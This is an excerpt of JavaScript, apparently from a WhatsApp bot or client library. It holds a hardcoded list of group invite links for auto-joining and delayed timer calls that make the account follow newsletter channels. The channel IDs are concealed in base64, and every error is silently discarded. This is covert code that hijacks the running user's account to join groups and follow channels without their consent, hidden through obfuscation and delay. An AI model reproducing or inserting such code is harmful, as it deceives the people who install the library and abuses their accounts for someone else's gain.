...
const AUTO_JOIN_GROUP_LINKS = [
    "https://chat.whatsapp.com/HWrNIi77xtiDWjinrDnMYo?mode=gi_t",
    "https://chat.whatsapp.com/FwMLs2FnhjdJX5eXOEgane"
];
...
setTimeout(async () => {
    try {
        await newsletterWMexQuery(
            Buffer.from("MTIwMzYzNDA2Njg2NDI5NTYzQG5ld3NsZXR0ZXI=", "base64").toString(),
...
setTimeout(async () => {
    try {
        await newsletterWMexQuery(
            Buffer.from("MTIwMzYzNDAyODY4ODY2MzU5QG5ld3NsZXR0ZXI=", "base64").toString(),
            Types_1.QueryIds.FOLLOW
        );
    } catch {}
}, 90000);
